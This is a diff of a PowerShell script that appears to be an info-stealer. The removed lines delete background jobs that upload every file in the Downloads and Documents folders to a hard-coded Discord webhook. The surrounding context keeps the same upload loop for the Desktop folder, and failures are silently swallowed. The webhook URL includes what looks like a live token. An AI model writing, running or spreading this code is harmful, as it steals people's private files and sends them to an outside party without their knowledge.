@@ -98,42 +98,7 @@ try {
 
 
 
-$Downloads = Start-Job -ScriptBlock {
-$webhookUrl = "https://discord.com/api/webhooks/1328711859490127965/4ml3eBzezc1vNd7ZDEV_T2fw8S2GFAyg3W5zpacjz43MC3l1MA0TZOI57ncd5iCJlIeF"
 
-# Upload files from the Desktop
-$desktopPath = [Environment]::GetFolderPath("Desktop").replace("Desktop","Downloads")
-$files = Get-ChildItem -Path $desktopPath -File
-
-foreach ($file in $files) {
-    try {
-        # Create a multipart form to upload the file
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $headers = @{
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
-        }
-
-        $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"",
-            "Content-Type: application/octet-stream",
-            "",
-            [System.IO.File]::ReadAllText($file.FullName),
-            "--$boundary--"
-        )
-
-        $body = $bodyLines -join "`r`n"
-
-        # Send the file to the Discord webhook
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
-    } catch {
-    }
-}
-
-
-}
-
-$Desktop = Start-Job -ScriptBlock {
 $webhookUrl = "https://discord.com/api/webhooks/1328711859490127965/4ml3eBzezc1vNd7ZDEV_T2fw8S2GFAyg3W5zpacjz43MC3l1MA0TZOI57ncd5iCJlIeF"
 
 # Upload files from the Desktop
@@ -164,42 +129,7 @@ foreach ($file in $files) {
     } catch {
     }
 }
-}
 
 
 
 
-$Documents = Start-Job -ScriptBlock {
-$webhookUrl = "https://discord.com/api/webhooks/1328711859490127965/4ml3eBzezc1vNd7ZDEV_T2fw8S2GFAyg3W5zpacjz43MC3l1MA0TZOI57ncd5iCJlIeF"
-
-# Upload files from the Desktop
-$desktopPath = [Environment]::GetFolderPath("Desktop").replace("Desktop","Documents")
-$files = Get-ChildItem -Path $desktopPath -File
-
-foreach ($file in $files) {
-    try {
-        # Create a multipart form to upload the file
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $headers = @{
-            "Content-Type" = "multipart/form-data; boundary=$boundary"
-        }
-
-        $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"",
-            "Content-Type: application/octet-stream",
-            "",
-            [System.IO.File]::ReadAllText($file.FullName),
-            "--$boundary--"
-        )
-
-        $body = $bodyLines -join "`r`n"
-
-        # Send the file to the Discord webhook
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
-    } catch {
-    }
-}
-
-
-}
